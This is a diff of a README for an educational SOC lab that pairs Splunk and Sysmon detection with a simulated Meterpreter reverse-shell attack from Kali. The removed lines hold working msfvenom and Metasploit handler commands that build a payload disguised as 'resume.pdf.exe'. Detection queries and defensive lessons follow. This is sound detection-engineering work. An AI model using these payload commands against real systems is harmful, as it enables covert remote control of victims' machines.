@@ -1,219 +1,118 @@
 # SOC Project – Splunk Lab: Monitor, Attack Simulation & Detection
 
-## Overview
+## 🧭 Overview
 
-This project demonstrates the setup and use of a Security Operations Center (SOC) lab environment using **Splunk Enterprise**, **Sysmon**, and **Windows/Linux endpoints**. The objective is to simulate an attack within a controlled lab network, capture the telemetry generated, and use Splunk to analyze and detect the malicious activity.
+This project demonstrates a complete SOC (Security Operations Center) simulation using **Splunk**, **Sysmon**, and **Kali Linux** to monitor, attack, and detect malicious activity in a safe virtual environment. The goal was to replicate a real-world endpoint compromise, analyze the resulting telemetry, and apply security monitoring and detection techniques using Splunk.
 
-The project follows a typical SOC workflow:
-
-1. **Monitoring**: Collecting logs from multiple endpoints.
-2. **Attack Simulation**: Executing a controlled adversary scenario (reverse shell).
-3. **Detection**: Using Splunk and Sysmon telemetry to identify and analyze malicious behavior.
-
-> ⚠️ **Disclaimer:** This experiment was performed in an isolated lab environment with no internet access. All offensive tools were used strictly for educational and defensive security purposes.
+> ⚠️ **Note:** All testing was conducted in an **isolated lab network**. No part of this simulation involved any production or external systems.
 
 ---
 
-## 1. Lab Architecture
+## 🧱 Lab Summary
 
-### Components
+**Environment Setup:**
 
-* **Splunk Enterprise Server (Ubuntu 22.04)** – Acts as the central SIEM server.
-* **Windows 11 Endpoint** – Acts as the victim machine.
-* **Kali Linux** – Simulates the attacker machine.
+* **Splunk Enterprise (Ubuntu 22.04):** SIEM and log analysis platform.
+* **Windows 11:** Target/victim machine running Sysmon and Splunk Universal Forwarder.
+* **Kali Linux:** Attacker machine running Metasploit.
 
-### Network Setup
+**Network:** Host-only adapter ensuring full isolation from the internet.
 
-All machines were configured on a **host-only virtual network**, ensuring complete isolation from the internet.
+**Data Sources:**
 
-**Data Flow:**
-
-```
-Windows 11 (Sysmon + Splunk Universal Forwarder) → Splunk Server (Ubuntu)
-Linux host logs → Splunk Server (local input)
-```
-
-![Architecture Diagram]()
+* Windows Event Logs (Security, System, Application)
+* Sysmon Event Logs (Process creation, network connections, etc.)
+* Linux local logs (via /var/log monitoring)
 
 ---
 
-## 2. Environment Setup
+## ⚔️ Attack Simulation
 
-### Splunk Installation (Ubuntu 22.04)
+**Objective:** Simulate a Windows host compromise via a reverse TCP payload to test telemetry visibility.
 
-```bash
-sudo dpkg -i splunk-10.0.1-c486717c322b-linux-amd64.deb
-sudo /opt/splunk/bin/splunk start --accept-license
-```
+**Execution Flow:**
 
-Enable Splunk to start at boot:
+1. Implemented a Recon phase using **Nmap** to scan the target victim.
+1. Payload creation with **msfvenom** (reverse TCP Meterpreter).
+2. Payload delivered and executed on Windows endpoint.
+3. Metasploit listener on Kali received the callback.
 
-```bash
-sudo /opt/splunk/bin/splunk enable boot-start
-```
+**Observed Behavior:**
 
-### Sysmon Installation (Windows 11)
-
-1. Download Sysmon from Sysinternals.
-2. Install using a custom configuration file:
-
-```powershell
-Sysmon64.exe -accepteula -i sysmonconfig.xml
-```
-
-### Splunk Universal Forwarder (Windows 11)
-
-1. Install Splunk UF and set forwarding to Splunk Server:
-
-```powershell
-splunk add forward-server <Splunk-IP>:9997 -auth admin:<password>
-```
-
-2. Configure inputs in `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`:
-
-```ini
-[WinEventLog://Security]
-index=wineventlog
-
-[WinEventLog://System]
-index=wineventlog
-
-[WinEventLog://Application]
-index=wineventlog
-
-[WinEventLog://Microsoft-Windows-Sysmon/Operational]
-index=sysmon
-```
-
-3. Restart the forwarder:
-
-```powershell
-splunk restart
-```
+* `resume.pdf.exe` initiated a Meterpreter session.
+* Sysmon captured process creation and network connection to attacker IP (port 4444).
 
 ---
 
-## 3. Attack Simulation
+## 🕵️ Detection in Splunk
 
-### Objective
+**Telemetry Identified:**
 
-Simulate an attacker (Kali) delivering a reverse TCP payload to the Windows endpoint to test telemetry visibility.
+* **Event ID 1:** Process creation (resume.pdf.exe)
+* **Event ID 3:** Network connection to attacker IP
+* **Event ID 10:** Process access (post-exploitation)
 
-### Steps
-
-1. On Kali, create a reverse shell payload:
-
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=4444 -f exe -o resume.pdf.exe
-```
-
-2. Deliver payload to Windows (manually transferred within the host-only network).
-3. Start Metasploit listener:
-
-```bash
-msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST <Kali-IP>
-set LPORT 4444
-run
-```
-
-4. Execute the payload on the Windows 11 machine.
-
-![Attack Execution Screenshot]()
-
-Once executed, the attacker successfully established a reverse shell session back to the Kali machine.
-
----
-
-## 4. Telemetry Collection & Detection
-
-### Sysmon Event Monitoring
-
-Sysmon generated several key event types:
-
-* **Event ID 1** – Process creation (`resume.pdf.exe`)
-* **Event ID 3** – Network connection to attacker IP (port 4444)
-* **Event ID 10** – Process access (post-exploitation)
-
-These events were forwarded to Splunk via the Universal Forwarder.
-
-### Splunk Queries (SPL)
-
-#### Detecting the Malicious Executable
+**Key SPL Queries:**
 
 ```spl
 index=sysmon Image="*resume.pdf.exe" | table _time, host, User, ParentImage, CommandLine
 ```
 
-#### Detecting Reverse Shell Connection
-
 ```spl
 index=sysmon EventCode=3 DestinationPort=4444 | table _time, Image, DestinationIp, DestinationPort
 ```
 
-#### Correlating Parent/Child Process Chain
-
 ```spl
-index=sysmon EventCode=1 Image="*resume.pdf.exe" OR Image="*cmd.exe" OR Image="*powershell.exe"
-| table _time, ParentImage, Image, CommandLine
+index=sysmon EventCode=1 Image="*powershell.exe" | table _time, ParentImage, Image, CommandLine
 ```
 
-### Data Model Example (if CIM enabled)
-
-```spl
-| datamodel Endpoint Processes search process_name="resume.pdf.exe"
-| table _time, user, process, parent_process, dest
-```
-
-These queries revealed a suspicious process chain:
+**Findings:**
+The attack created a distinct process chain:
 
 ```
 explorer.exe → resume.pdf.exe → cmd.exe → powershell.exe
 ```
 
-This strongly indicated post-exploitation activity consistent with malware execution.
-
-![Detection Screenshot]()
+This pattern clearly indicated malicious behavior and command execution.
 
 ---
 
-## 5. Conclusion & Lessons Learned
+## 📊 Results & Observations
 
-### Key Takeaways
-
-* Successfully built an isolated SOC lab simulating real-world attack telemetry.
-* Verified the ability of Splunk + Sysmon to capture and analyze endpoint activity.
-* Demonstrated the importance of Sysmon configuration tuning to ensure high-fidelity event logging.
-* SPL queries effectively detected malicious behaviors like reverse shells and encoded PowerShell commands.
-
-### Lessons Learned
-
-* Isolation is everything: Internal-only networking keeps experiments safe.
-* User deception is trivial: Double extensions (.pdf.exe) still trick users. Enable “show file extensions.”
-* Least privilege matters: Admin users make attacker life easy; standardize non-admin daily use.
-Application control helps: Use AppLocker/allow-listing to block unknown binaries (especially in user-write paths).
-* EDR + Logging: Keep Defender/EDR enabled with tamper protection; Sysmon + SIEM provide the forensic truth.
-* Detections to keep: Alert on suspicious parent/child combos (e.g., *.pdf.exe → cmd.exe, cmd.exe → net.exe) and unusual outbound connections from user processes.
-
+* Splunk successfully ingested and indexed Sysmon and Windows logs.
+* The attack’s network and process artifacts were visible and queryable.
+* SPL queries effectively identified post-exploitation behavior.
+* Sysmon provided high-fidelity endpoint telemetry essential for detection.
 
 ---
 
-## 6. Future Improvements
+## 🧠 Lessons Learned
 
-* Develop **alerting rules** (correlation searches) in Splunk.
-* Visualize process/network telemetry via **dashboards**.
+1. **Isolation is everything**: Internal-only networking keeps experiments safe.
+User deception is trivial: Double extensions (.pdf.exe) still trick users. Enable “show file extensions.”
+2. **Least privilege matters**: Admin users make attacker life easy; standardize non-admin daily use.
+3. **Application control helps**: Use AppLocker/allow-listing to block unknown binaries (especially in user-write paths).
+4. **EDR + Logging**: Keep Defender/EDR enabled with tamper protection; Sysmon + SIEM provide the forensic truth.
+Detections to keep: Alert on suspicious parent/child combos (e.g., *.pdf.exe → cmd.exe, cmd.exe → net.exe) and unusual outbound connections from user processes.
 
----
-
-## References
-
-* [Sysmon Documentation – Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
-* [Splunk Common Information Model Add-on](https://splunkbase.splunk.com/app/1621/)
-* [MITRE ATT&CK Framework](https://attack.mitre.org/)
+5. **Documentation & repeatability** make the lab useful for continuous learning.
 
 ---
 
-> Author: crab241
-> For educational and research purposes only.
+## 🚀 Future Work
+
+* Develop **automated correlation searches** for alerts.
+* Visualize detection data using Splunk dashboards.
+
+---
+
+## 📘 Full Report
+
+For full setup instructions, commands, configurations, and analysis screenshots, please refer to the detailed report:
+
+> [SOC Project – Splunk Lab: Monitor, Attack Simulation & Detection (Full Report)](./SOC%20Project-Splunk%20lab%20Monitor%2C%20Attack%20simulation%20%26%20Detection.docx)
+
+---
+
+**Author:** crab241
+**Purpose:** Educational research on SOC detection engineering and endpoint visibility.
